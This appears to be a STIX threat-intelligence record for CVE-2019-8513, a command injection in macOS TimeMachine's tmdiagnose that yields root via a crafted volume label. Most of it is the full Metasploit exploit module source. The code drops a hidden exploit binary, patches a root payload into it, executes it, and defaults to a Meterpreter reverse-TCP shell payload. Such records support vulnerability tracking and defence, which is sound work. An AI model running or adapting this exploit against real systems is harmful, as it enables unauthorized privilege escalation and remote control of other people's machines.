{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8f58e536-0040-4d17-a1b7-4f7670fe10b9",
    "created": "2024-08-14T16:34:44.342143Z",
    "modified": "2024-08-14T16:34:44.342147Z",
    "name": "Mac OS X TimeMachine (tmdiagnose) Command Injection Privilege Escalation",
    "description": " This module exploits a command injection in TimeMachine on macOS <= 10.14.3 in order to run a payload as root. The tmdiagnose binary on OSX <= 10.14.3 suffers from a command injection vulnerability that can be exploited by creating a specially crafted disk label.  The tmdiagnose binary uses awk to list every mounted volume, and composes shell commands based on the volume labels. By creating a volume label with the backtick character, we can have our own binary executed with root priviledges.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/timemachine_cmd_injection.rb",
            "external_id": "timemachine_cmd_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-8513"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/0xcc/rootpipe-reborn-part-i-cve-2019-8513-timemachine-root-command-injection-47e056b3cb43"
        },
        {
            "source_name": "reference",
            "url": "https://support.apple.com/en-in/HT209600"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/ChiChou/sploits"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Post::OSX::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Mac OS X TimeMachine (tmdiagnose) Command Injection Privilege Escalation',\n      'Description'   => %q{\n          This module exploits a command injection in TimeMachine on macOS <= 10.14.3 in\n        order to run a payload as root. The tmdiagnose binary on OSX <= 10.14.3 suffers\n        from a command injection vulnerability that can be exploited by creating a\n        specially crafted disk label.\n\n          The tmdiagnose binary uses awk to list every mounted volume, and composes\n        shell commands based on the volume labels. By creating a volume label with the\n        backtick character, we can have our own binary executed with root priviledges.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        => [\n          'CodeColorist', # Discovery and exploit\n          'timwr',        # Metasploit module\n      ],\n      'References'     => [\n          ['CVE', '2019-8513'],\n          ['URL', 'https://medium.com/0xcc/rootpipe-reborn-part-i-cve-2019-8513-timemachine-root-command-injection-47e056b3cb43'],\n          ['URL', 'https://support.apple.com/en-in/HT209600'],\n          ['URL', 'https://github.com/ChiChou/sploits'],\n      ],\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => { 'WfsDelay' => 300, 'PAYLOAD' => 'osx/x64/meterpreter/reverse_tcp' },\n      'Targets'        => [\n          [ 'Mac OS X x64 (Native Payload)', { 'Arch' => ARCH_X64, 'Platform' => [ 'osx' ] } ],\n          [ 'Python payload',                { 'Arch' => ARCH_PYTHON, 'Platform' => [ 'python' ] } ],\n          [ 'Command payload',               { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] } ],\n      ],\n      'DisclosureDate' => '2019-04-13'))\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def upload_executable_file(filepath, filedata)\n    print_status(\"Uploading file: '#{filepath}'\")\n    write_file(filepath, filedata)\n    chmod(filepath)\n    register_file_for_cleanup(filepath)\n  end\n\n  def check\n    version = Rex::Version.new(get_system_version)\n    if version >= Rex::Version.new('10.14.4')\n      CheckCode::Safe\n    else\n      CheckCode::Appears\n    end\n  end\n\n  def exploit\n    if check != CheckCode::Appears\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless writable? datastore['WritableDir']\n      fail_with Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\"\n    end\n\n    exploit_data = File.binread(File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2019-8513\", \"exploit\" ))\n    if target['Arch'] == ARCH_X64\n      root_cmd = payload.encoded\n    else\n      root_cmd = payload.raw\n      if target['Arch'] == ARCH_PYTHON\n        root_cmd = \"echo \\\"#{root_cmd}\\\" | python\"\n      end\n      root_cmd = \"CMD:#{root_cmd}\"\n    end\n    if root_cmd.length > 1024\n      fail_with Failure::PayloadFailed, \"Payload size (#{root_cmd.length}) exceeds space in payload placeholder\"\n    end\n\n    placeholder_index = exploit_data.index('ROOT_PAYLOAD_PLACEHOLDER')\n    exploit_data[placeholder_index, root_cmd.length] = root_cmd\n\n    exploit_file = \"#{datastore['WritableDir']}/.#{Rex::Text::rand_text_alpha_lower(6..12)}\"\n    upload_executable_file(exploit_file, exploit_data)\n\n    print_status(\"Executing exploit '#{exploit_file}'\")\n    result = cmd_exec(exploit_file)\n    print_status(\"Exploit result:\\n#{result}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-04-13"
}